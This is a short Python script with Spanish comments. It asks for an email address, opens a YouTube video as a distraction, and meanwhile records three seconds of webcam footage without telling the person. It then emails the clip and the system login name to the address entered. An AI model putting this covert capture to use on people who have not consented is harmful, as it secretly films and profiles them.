import cv2
import smtplib
import time
import easygui
import os
import webbrowser
from email.message import EmailMessage

# Configuración del correo
email_remitente = "" #Ingrese su correo remitente
email_password = ""  # Usa una contraseña de aplicación

# URL del video de YouTube (cámbialo por el que quieras)
url_video = "https://www.youtube.com/watch?v=EtmgJEAoCQI"  

# Mostrar cuadro de diálogo para ingresar el correo
print("📩 Esperando que el usuario ingrese el correo...")
cap = None  # Inicializamos la cámara, pero sin activarla todavía

# Guardar nombre del video
nombre_video = "registro del Video avi"
duracion = 3  # Segundos

# Detectar la primera letra ingresada y empezar a grabar
correo_destinatario = ""
while not correo_destinatario:  
    correo_destinatario = easygui.enterbox("Ingresa tu correo:")  # Espera a que el usuario escriba algo
    if correo_destinatario:
        print("🎥 Iniciando grabación...")
        
        # Abrir video de YouTube en el navegador
        webbrowser.open(url_video)

        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        fps = 20.0
        frame_size = (int(cap.get(3)), int(cap.get(4)))
        out = cv2.VideoWriter(nombre_video, fourcc, fps, frame_size)

        start_time = time.time()
        while int(time.time() - start_time) < duracion:
            ret, frame = cap.read()
            if ret:
                out.write(frame)

        cap.release()
        out.release()
        print("✅ Video grabado correctamente.")

# Obtener nombre del usuario del sistema (posible dueño del correo)
usuario_sistema = os.getlogin()

# Crear el mensaje de correo
mensaje = EmailMessage()
mensaje["From"] = email_remitente
mensaje["To"] = correo_destinatario
mensaje["Subject"] = "📷 Registro automático de usuario"
mensaje.set_content(f"Hola {usuario_sistema}, este video se grabó mientras ingresabas tu correo ({correo_destinatario}).")

# Adjuntar el video
try:
    with open(nombre_video, "rb") as vid:
        mensaje.add_attachment(vid.read(), maintype="video", subtype="avi", filename=nombre_video)
except FileNotFoundError:
    print("❌ No se encontró el video.")

# Enviar el correo
try:
    servidor = smtplib.SMTP("smtp.gmail.com", 587)
    servidor.starttls()
    servidor.login(email_remitente, email_password)
    servidor.send_message(mensaje)
    servidor.quit()
    print(f"✅ Correo enviado a {correo_destinatario} con el video adjunto.")
except Exception as e:
    print(f"❌ Error al enviar el correo: {e}")
